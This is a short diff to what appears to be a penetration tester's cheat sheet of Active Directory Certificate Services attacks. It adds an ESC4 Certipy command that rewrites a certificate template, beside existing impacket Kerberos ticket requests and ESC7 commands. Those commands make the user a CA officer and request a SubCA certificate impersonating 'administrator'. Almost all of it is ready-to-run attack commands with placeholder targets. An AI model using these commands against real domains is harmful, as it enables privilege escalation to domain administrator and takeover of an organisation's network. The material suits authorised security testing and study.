@@ -591,6 +591,9 @@ https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; kcme
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':$HASH'; kcme
 
++---------- ESC4 ----------+
+certipy template -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -template '' -write-default-configuration
+
 +---------- ESC7 ----------+
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template 'SubCA' -upn 'administrator' -target $DC -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
